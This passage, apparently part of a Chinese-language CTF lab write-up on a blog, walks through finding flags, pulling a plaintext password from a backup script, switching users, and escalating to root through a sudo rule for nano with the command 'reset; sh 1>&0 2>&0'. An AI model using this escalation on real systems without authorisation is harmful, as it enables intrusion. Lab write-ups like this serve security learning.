+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">46</span><span><span style="color:#a5d6ff"> -----------------------------------------
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">47</span><span><span style="color:#a5d6ff">   \
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">48</span><span><span style="color:#a5d6ff">    \
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">49</span><span><span style="color:#a5d6ff">        .--.
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">50</span><span><span style="color:#a5d6ff">       |o_o |
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">51</span><span><span style="color:#a5d6ff">       |:_/ |
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">52</span><span><span style="color:#a5d6ff">      //   \ \
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">53</span><span><span style="color:#a5d6ff">     (|     | )
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">54</span><span><span style="color:#a5d6ff">    /&#39;</span><span style="color:#79c0ff">\_</span>   _/<span style="color:#a5d6ff">`</span><span style="color:#79c0ff">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">55</span><span>    <span style="color:#79c0ff">\_</span>__<span style="color:#ff7b72;font-weight:bold">)=(</span>___/</span></span></code></pre></div><p>接着找到第一个flag</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>wtf@wtf:~$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>Desktop  Documents  Downloads  Music  Pictures  Public
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>wtf@wtf:~$ cd Downloads
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>wtf@wtf:~/Downloads$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>flag-1.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">6</span><span>wtf@wtf:~/Downloads$ cat flag-1.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">7</span><span>VGhlIGZsYWcgaXMgdGhlIGVuY29kZWQgc3RyaW5nIGl0c2VsZg</span></span></code></pre></div><p>进行解码</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>wtf@wtf:~/Downloads$ echo <span style="color:#a5d6ff">&#34;VGhlIGZsYWcgaXMgdGhlIGVuY29kZWQgc3RyaW5nIGl0c2VsZg&#34;</span> | base64 -d
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>The flag is the encoded string itselfbase64: invalid input</span></span></code></pre></div><p>接着检查/Documents文件夹</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>wtf@wtf:~$ cd ~/Documents
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>wtf@wtf:~/Documents$ ls
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span>backup.sh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>wtf@wtf:~/Documents$ cat backup.sh
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span><span style="color:#79c0ff">REMOTE</span><span style="color:#ff7b72;font-weight:bold">=</span>1.2.3.4
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span><span style="color:#79c0ff">SOURCE</span><span style="color:#ff7b72;font-weight:bold">=</span>/home/rooot
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span><span style="color:#79c0ff">TARGET</span><span style="color:#ff7b72;font-weight:bold">=</span>/usr/local/backup
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span><span style="color:#79c0ff">LOG</span><span style="color:#ff7b72;font-weight:bold">=</span>/home/rooot/bck.log 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span><span style="color:#79c0ff">DATE</span><span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#a5d6ff">`</span>date +%y<span style="color:#79c0ff">\.</span>%m<span style="color:#79c0ff">\.</span>%d<span style="color:#79c0ff">\.</span><span style="color:#a5d6ff">`</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span><span style="color:#79c0ff">USER</span><span style="color:#ff7b72;font-weight:bold">=</span>n00b
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span><span style="color:#8b949e;font-style:italic">#aw3s0m3p@$$w0rd</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>ssh <span style="color:#79c0ff">$USER</span>@<span style="color:#79c0ff">$REMOTE</span> mkdir <span style="color:#79c0ff">$TARGET</span>/<span style="color:#79c0ff">$DATE</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span><span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">[</span> -d <span style="color:#a5d6ff">&#34;</span><span style="color:#79c0ff">$SOURCE</span><span style="color:#a5d6ff">&#34;</span> <span style="color:#ff7b72;font-weight:bold">]</span>; <span style="color:#ff7b72">then</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">16</span><span>    <span style="color:#ff7b72">for</span> i in <span style="color:#a5d6ff">`</span>ls <span style="color:#79c0ff">$SOURCE</span> | grep <span style="color:#a5d6ff">&#39;data&#39;</span><span style="color:#a5d6ff">`</span>;<span style="color:#ff7b72">do</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">17</span><span>             echo <span style="color:#a5d6ff">&#34;Begining copy of&#34;</span> <span style="color:#79c0ff">$i</span>  &gt;&gt; <span style="color:#79c0ff">$LOG</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">18</span><span>             scp  <span style="color:#79c0ff">$SOURCE</span>/<span style="color:#79c0ff">$i</span> <span style="color:#79c0ff">$USER</span>@<span style="color:#79c0ff">$REMOTE</span>:<span style="color:#79c0ff">$TARGET</span>/<span style="color:#79c0ff">$DATE</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">19</span><span>             echo <span style="color:#79c0ff">$i</span> <span style="color:#a5d6ff">&#34;completed&#34;</span> &gt;&gt; <span style="color:#79c0ff">$LOG</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">20</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">21</span><span>                <span style="color:#ff7b72">if</span> <span style="color:#ff7b72;font-weight:bold">[</span> -n <span style="color:#a5d6ff">`</span>ssh <span style="color:#79c0ff">$USER</span>@<span style="color:#79c0ff">$REMOTE</span> ls <span style="color:#79c0ff">$TARGET</span>/<span style="color:#79c0ff">$DATE</span>/<span style="color:#79c0ff">$i</span> 2&gt;/dev/null<span style="color:#a5d6ff">`</span> <span style="color:#ff7b72;font-weight:bold">]</span>;<span style="color:#ff7b72">then</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">22</span><span>                    rm <span style="color:#79c0ff">$SOURCE</span>/<span style="color:#79c0ff">$i</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">23</span><span>                    echo <span style="color:#79c0ff">$i</span> <span style="color:#a5d6ff">&#34;removed&#34;</span> &gt;&gt; <span style="color:#79c0ff">$LOG</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">24</span><span>                    echo <span style="color:#a5d6ff">&#34;####################&#34;</span> &gt;&gt; <span style="color:#79c0ff">$LOG</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">25</span><span>                                <span style="color:#ff7b72">else</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">26</span><span>                                        echo <span style="color:#a5d6ff">&#34;Copy not complete&#34;</span> &gt;&gt; <span style="color:#79c0ff">$LOG</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">27</span><span>                                        exit <span style="color:#a5d6ff">0</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">28</span><span>                <span style="color:#ff7b72">fi</span> 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">29</span><span>    <span style="color:#ff7b72">done</span>    
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">30</span><span><span style="color:#ff7b72">else</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">31</span><span>    echo <span style="color:#a5d6ff">&#34;Directory is not present&#34;</span> &gt;&gt; <span style="color:#79c0ff">$LOG</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">32</span><span>    exit <span style="color:#a5d6ff">0</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">33</span><span><span style="color:#ff7b72">fi</span></span></span></code></pre></div><p>发现有用户名n00b，密码aw3s0m3p@$$w0rd</p>
+<p>切换为n00b用户</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>wtf@wtf:~/Documents$ su n00b
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>Password: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span> _________________________________________
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span>/ You will be recognized and honored as a <span style="color:#79c0ff">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span><span style="color:#79c0ff">\ </span>community leader.                       /
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span> -----------------------------------------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span>   <span style="color:#79c0ff">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span>    <span style="color:#79c0ff">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span>        .--.
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span>       |o_o |
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>       |:_/ |
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>      //   <span style="color:#79c0ff">\ \
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>     <span style="color:#ff7b72;font-weight:bold">(</span>|     | <span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span>    /<span style="color:#f85149">&#39;</span><span style="color:#79c0ff">\_</span>   _/<span style="color:#a5d6ff">`</span><span style="color:#79c0ff">\
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span>    <span style="color:#79c0ff">\_</span>__<span style="color:#ff7b72;font-weight:bold">)=(</span>___/</span></span></code></pre></div><h2 id="三提权">三、提权<a class="anchor" href="#%e4%b8%89%e6%8f%90%e6%9d%83">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span>n00b@wtf:~$ pwd
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>/var/www/rooot
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>n00b@wtf:~$ sudo -l
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">4</span><span>Matching Defaults entries <span style="color:#ff7b72">for</span> n00b on wtf:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">5</span><span>    env_reset, mail_badpass, <span style="color:#79c0ff">secure_path</span><span style="color:#ff7b72;font-weight:bold">=</span>/usr/local/sbin<span style="color:#79c0ff">\:</span>/usr/local/bin<span style="color:#79c0ff">\:</span>/usr/sbin<span style="color:#79c0ff">\:</span>/usr/bin<span style="color:#79c0ff">\:</span>/sbin<span style="color:#79c0ff">\:</span>/bin<span style="color:#79c0ff">\:</span>/snap/bin
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">6</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">7</span><span>User n00b may run the following commands on wtf:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">8</span><span>    <span style="color:#ff7b72;font-weight:bold">(</span>root<span style="color:#ff7b72;font-weight:bold">)</span> NOPASSWD: /bin/nano</span></span></code></pre></div><p>发现可以用nano编辑器，nano编辑器允许二进制文件以超级用户身份运行sudo，它不会放弃提升的权限</p>
+<ol>
+<li>sudo nano</li>
+<li>ctrl+r，ctrl+x</li>
+<li>输入 reset; sh 1&gt;&amp;0 2&gt;&amp;0并回车</li>
+<li>界面会变得混乱，这是因为在nano这个应用程序内部强行开启一个shell</li>
+<li>whoami</li>
+<li>cd /root</li>
+<li>cat root.txt</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 1</span><span>Command to execute: reset; sh 1&gt;&amp;<span style="color:#a5d6ff">0</span> 2&gt;&amp;0# whoami                                                                                                             
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 2</span><span>rootet Help                                                                   ^X Read File
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 3</span><span><span style="color:#8b949e;font-style:italic"># lsancel                                                                     M-F New Buffer</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 4</span><span><span style="color:#8b949e;font-style:italic"># cd /root</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 5</span><span><span style="color:#8b949e;font-style:italic"># ls</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 6</span><span>root.txt  snap
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 7</span><span><span style="color:#8b949e;font-style:italic"># cat root.txt</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 8</span><span><span style="color:#79c0ff">RW5kb3JzZSBtZSBvbiBsaW5rZWRpbiA9PiBodHRwczovL3d3dy5saW5rZWRpbi5jb20vaW4vZGVlcGFrLWFoZWVyCg</span><span style="color:#ff7b72;font-weight:bold">==</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681"> 9</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">10</span><span>Follow me on Twitter https://www.twitter.com/Deepakhr9
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">11</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">12</span><span>TryHackMe --&gt; https://www.tryhackme.com/p/Malwre99
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">13</span><span>Github --&gt; https://www.github.com/Deepak-Aheer
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">14</span><span><span style="color:#ff7b72;font-weight:bold">(</span>the flag is my LinkedIn username<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">15</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">16</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">17</span><span>        THANK YOU <span style="color:#ff7b72">for</span> PLAYING THIS CTF
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">18</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">19</span><span>        But REMEMBER we<span style="color:#f85149">&#39;</span>re still N00bs ;<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">20</span><span><span style="color:#8b949e;font-style:italic"># </span></span></span></code></pre></div><p>最终解码
+<code>echo &quot;RW5kb3JzZSBtZSBvbiBsaW5rZWRpbiA9PiBodHRwczovL3d3dy5saW5rZWRpbi5jb20vaW4vZGVlcGFrLWFoZWVyCg&quot; | base64 -d</code>
+其中<code>-d</code>是解码数据，结果如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-ZSH" data-lang="ZSH"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">1</span><span><span style="color:#8b949e;font-style:italic"># echo &#34;RW5kb3JzZSBtZSBvbiBsaW5rZWRpbiA9PiBodHRwczovL3d3dy5saW5rZWRpbi5jb20vaW4vZGVlcGFrLWFoZWVyCg&#34; | base64 -d</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">2</span><span>Endorse me on <span style="color:#79c0ff">linkedin</span> <span style="color:#ff7b72;font-weight:bold">=</span>&gt; https://www.linkedin.com/in/deepak-aheer
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6e7681">3</span><span>base64: invalid input</span></span></code></pre></div></article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <footer class="custom-footer">
+  <span class="status-dot"></span>
+  <span>2026 vnccer <a href="https://creativecommons.org/licenses/by/4.0/" target="_blank" class="license-link">CC BY 4.0</a></span>
+</footer>
+ 
+        
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+        
+        
+  
+ 
+        
+  
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#一信息收集">一、信息收集</a>
+          <ul>
+            <li><a href="#11-使用nmap对目标靶机扫描">1.1 使用nmap对目标靶机扫描</a></li>
+            <li><a href="#12-ftp端口">1.2 ftp端口</a></li>
+            <li><a href="#13-80端口">1.3 80端口</a></li>
+          </ul>
+        </li>
+        <li><a href="#二信息分析">二、信息分析</a>
+          <ul>
+            <li><a href="#21文件整理">2.1文件整理</a></li>
+            <li><a href="#22图片检查">2.2图片检查</a></li>
+            <li><a href="#23-ssh登录">2.3 SSH登录</a></li>
+          </ul>
+        </li>
+        <li><a href="#三提权">三、提权</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
